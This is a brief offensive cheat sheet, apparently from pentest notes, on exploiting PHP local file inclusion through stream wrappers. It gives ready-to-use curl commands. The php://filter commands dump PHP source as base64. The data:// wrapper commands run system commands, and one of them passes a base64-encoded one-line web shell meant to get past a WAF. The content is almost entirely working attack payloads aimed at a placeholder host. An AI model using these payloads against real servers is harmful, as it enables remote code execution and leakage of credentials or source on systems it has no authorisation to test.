# php Wrappers

__REQUIRES__

 - Misconfiguration

## Filter wrapper

Check if the filter wrapper works
```bash
curl http://example.local/meteor/index.php?page=php://filter/resource=admin.php
```

Encode and output the php file
```bash
curl http://example.local/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

The resulting payload will need to be base64 decoded
This can result in sensitive information leakage
```bash
echo "<payload>" | base64 -d
```

## Data Wrapper

using the data filter to run 'ls'
```bash
curl "http://example.local/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

encoding payload
```bash
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
```

dodging a WAF (includes base64 payload with webshell)
```bash
curl "http://example.local/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```